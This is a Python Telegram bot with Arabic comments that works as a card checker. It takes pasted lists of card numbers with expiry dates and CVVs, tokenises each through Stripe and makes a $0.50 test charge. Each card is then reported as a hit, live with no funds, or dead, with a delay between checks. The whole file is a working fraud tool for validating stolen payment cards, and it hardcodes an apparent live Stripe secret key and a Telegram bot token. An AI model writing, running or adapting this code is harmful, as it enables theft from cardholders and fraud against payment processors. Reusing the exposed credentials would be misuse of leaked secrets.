import stripe
import telebot
import os
import time
from flask import Flask
from threading import Thread

# --- سيرفر صغير للبقاء أونلاين على Render ---
app = Flask(__name__)
@app.route('/')
def health(): return "PRECISION ENGINE V3 ONLINE", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- بياناتك الخاصة (التوكن والمفتاح المحدثين) ---
stripe.api_key = "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"
bot = telebot.TeleBot("8551972896:AAGcP_yrXZgx-GvHDPda_tYVEq12L84H2hI")
ADMIN_ID = 5473153501

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "🎯 <b>تم تفعيل الفحص الدقيق (فاصل 5 ثوانٍ)</b>\n\nأرسل لستة البطاقات الآن. سيتم فحص كل بطاقة بعناية فائقة لضمان دقة النتائج 100%.", parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    if message.from_user.id != ADMIN_ID: return
    
    # تقسيم الرسالة إلى أسطر
    cards = [c.strip() for c in message.text.strip().split('\n') if "|" in c]
    if not cards:
        bot.reply_to(message, "❌ يرجى إرسال البطاقات بالتنسيق الصحيح: <code>CARD|MM|YY|CVV</code>", parse_mode="HTML")
        return

    total = len(cards)
    status_msg = bot.reply_to(message, f"🔍 جاري فحص {total} بطاقة...\n⏱️ الفاصل الزمني: 5 ثوانٍ لضمان الدقة.")
    
    hits, live, dead = 0, 0, 0

    for index, card in enumerate(cards, 1):
        try:
            # تنظيف البيانات
            c_data = card.replace(" ", "").split('|')
            if len(c_data) < 4: continue
            num, mm, yy, cvc = c_data
            
            # 1. المرحلة الأولى: إنشاء Token (التحقق من صحة الأرقام)
            token = stripe.Token.create(
                card={
                    "number": num,
                    "exp_month": int(mm),
                    "exp_year": int(yy),
                    "cvc": cvc,
                },
            )

            # 2. المرحلة الثانية: محاولة سحب 0.50$ (التحقق من الرصيد والعمل)
            stripe.Charge.create(
                amount=50, 
                currency="usd",
                description="Precision Validation Check",
                source=token.id,
            )
            
            hits += 1
            bot.send_message(message.chat.id, f"✅ <b>HIT FOUND!</b>\n<code>{card}</code>\n💰 الحالة: بطاقة شغالة وبها رصيد.", parse_mode="HTML")

        except stripe.error.CardError as e:
            err = e.json_body.get('error', {})
            code = err.get('code', '')

            # تصنيف الردود بناءً على أكواد البنك الرسمية
            if code == "insufficient_funds":
                live += 1
                bot.send_message(message.chat.id, f"✔️ <b>LIVE (No Funds)</b>\n<code>{card}</code>\n⚡ الحالة: شغالة لكن الرصيد صفر.", parse_mode="HTML")
            elif code in ["incorrect_cvc", "invalid_cvc"]:
                dead += 1
                bot.send_message(message.chat.id, f"💀 <b>DEAD (Wrong CVC)</b>\n<code>{card}</code>\n❌ السبب: الكود الخلفي خطأ.", parse_mode="HTML")
            else:
                dead += 1
                # يمكنك تفعيل السطر القادم لرؤية أسباب الرفض الأخرى (اختياري)
                # bot.send_message(message.chat.id, f"❌ <b>DECLINED</b>\n<code>{card}</code>\nالسبب: {err.get('message')}", parse_mode="HTML")
        
        except Exception:
            dead += 1

        # تحديث عداد الفحص في الرسالة الأصلية كل 3 بطاقات
        if index % 3 == 0 or index == total:
            try:
                bot.edit_message_text(f"⏳ جاري الفحص الدقيق ({index}/{total})...\n✅ HIT: {hits} | ⚡ LIVE: {live} | 💀 DEAD: {dead}", message.chat.id, status_msg.message_id)
            except: pass

        # ⏳ الانتظار لمدة 5 ثوانٍ قبل فحص البطاقة التالية (مطلبك الأساسي)
        if index < total:
            time.sleep(5)

    bot.send_message(message.chat.id, f"🏁 <b>اكتمل الفحص النهائي!</b>\n\n✅ HIT (رصيد): {hits}\n⚡ LIVE (صفر): {live}\n💀 DEAD (مرفوضة): {dead}", parse_mode="HTML")

if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    bot.remove_webhook()
    time.sleep(1)
    print("🚀 Precision Engine with 5s delay is starting...")
    bot.infinity_polling()
